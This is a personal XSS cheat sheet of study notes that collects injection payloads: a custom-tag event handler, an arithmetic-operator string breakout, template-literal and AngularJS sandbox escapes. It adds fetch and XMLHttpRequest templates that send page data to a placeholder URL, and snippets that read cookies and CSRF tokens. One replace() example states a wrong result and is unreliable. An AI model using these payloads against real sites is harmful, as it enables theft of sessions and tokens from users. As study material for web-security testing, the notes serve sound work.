# [XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

## Custom Tags
Sometimes we can inject custom tags into the page.
Ex: `<custom-tag onmouseover='alert("xss")'>`
**Note: In this case not closing the custom tag with `</custom-tag>` succeeds, but if we close the tag
it fails.**

## Interesting Payloads
### Arithmetic Operators To Execute JS Functions
**Payload:** `http://'-alert(1)-'`
**Final Result:** `<a id="author" href="http://'-alert(1)-'" onclick="var tracker={track(){}};tracker.track('http://'-alert(1)-'');">name</a>`
**Explanation:**
Sometimes adding arithmetic operators around JS functions might execute the function.
JS evaluates the payload above like so: `('http://' - alert(1)) - ''`, `('http://' - alert(1))` evaluates to `NaN`, then `NaN - ''` evaluatesto `NaN` too, but since the `alert()` function was evaluated in the first expression, it is executed. This technique only works in the a context where JS code can be executed (not in HTML).

## XSS To Exfiltrate Data
Remember that these are XSS payloads and should be executed within `<script></script>` tags.
### Using `XMLHttpRequest()`
```javascript
// Only add event listener if the payload should be executed on page load
window.addEventListener("load", function() {
	var xhr = new XMLHttpRequest();
	xhr.open("<http-method>", "<target-url>");
	var data = "<data-to-send>"
	xhr.send(data)
});
```
### Using `fetch()`
```javascript
// Only add event listener if the payload should be executed on page load
window.addEventListener("load", function() {
	var data = new FormData();
	data.append("key", "value");

	fetch("<target-url>", {
		method: '<http-method>',
		mode: 'no-cors',
		body: data
	});
});
```

### Reflected XSS In Template Literals
When an input is reflected on the page and within the page's source code it is inside a JS template literal (string within \`\`) we can execute JS functions with payloads like the following `${alert()}`.

## XSS in AngularJS
### Checking If XSS is Possible
	{{ 1 + 1 }} (Should return 2)

### ng-app Directive
	{{ $on.constructor('alert(1)') () }}
	{{ $eval.constructor('alert(1)') () }}

## READ JS FILES IF POSSIBLE / RELEVANT
### Where Is The Content Being Rendered?
JavaScript files might be relevant if some content on the page is only rendered by executing JavaScript code.
One way to know is to view the page's source code on the browser and check whether some content that is rendered on the screen
is missing from the source code. If that is the case, then that content might be rendered by JavaScript and therefore reading JS files
could be relevant to finding an XSS attack.

### The Replace Function
When the `replace()` function is given a string as its first argument it only replaces the first occurence of that string.
Ex:
```javascript
myString = '<h1>hello</h1>'
myString.replace('<', '&lt;').replace('>', '&gt;') // myString = '&lt;hello&gt;'

myString = '<><h1>hello</h1>'
myString.replace('<', '&lt;').replace('>', '&gt;') // myString = '&lt;&gt;<h1>hello</h1>'
```
## Accessing Values With JavaScript
### Accessing Cookie Values
```javascript
var csrf = document.cookie // In case of one cookie only
var cookieArray = document.cookie.split("; ") // Gives an array of key=value pairs we can split each on the = sign
var csrfCookieArray = cookieArray[0].split('=') // Gives an array csrf = ["key", "value"]
var csrfValue = csrfCookieArray[1] // Gives the value of the CSRF token
```
### Accessing HTML Element Attribute Values
```javascript
// Get the value of the first element with name=csrf
var csrf = document.getElementsByName('csrf')[0].value // Notice the plural Elements with an s.

// Get the value of the element with id=csrf
var csrf = document.getElementById('csrf').value // Notice the singular Element without an s.
```
